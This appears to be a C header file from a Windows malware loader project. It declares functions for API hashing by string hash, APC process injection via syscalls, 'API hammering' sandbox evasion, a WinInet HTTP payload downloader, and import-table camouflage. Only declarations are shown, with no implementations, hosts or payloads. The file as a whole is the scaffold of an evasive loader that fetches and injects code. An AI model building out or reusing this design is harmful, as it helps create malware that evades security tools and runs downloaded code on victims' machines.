#pragma once

#include <Windows.h>

#include "typedef.h"

// winapi.c
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

typedef struct _API_HASHING {
	fnGetTickCount64                pGetTickCount64;
	fnInternetOpenA                 pInternetOpenA;
	fnInternetConnectA              pInternetConnectA;
	fnHttpOpenRequestA              pHttpOpenRequestA;
	fnInternetSetOptionA            pInternetSetOptionA;
	fnHttpSendRequestA               pHttpSendRequestA;
	fnInternetReadFile              pInternetReadFile;
	fnInternetCloseHandle           pInternetCloseHandle;
	fnLoadLibraryA					pLoadLibraryA;
} API_HASHING, * PAPI_HASHING;

// inject.c
BOOL ApcInjectionViaSyscalls(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SIZE_T sSize);
void RandomFunction();
BOOL InitiateInjection(PVOID pPayload, SIZE_T sSize);

// apihashing.c
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

// apihammer.c
BOOL ApiHammering(DWORD Stress);

// downloader.c
DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl);

//iatcamo.c
VOID IatCamouflage();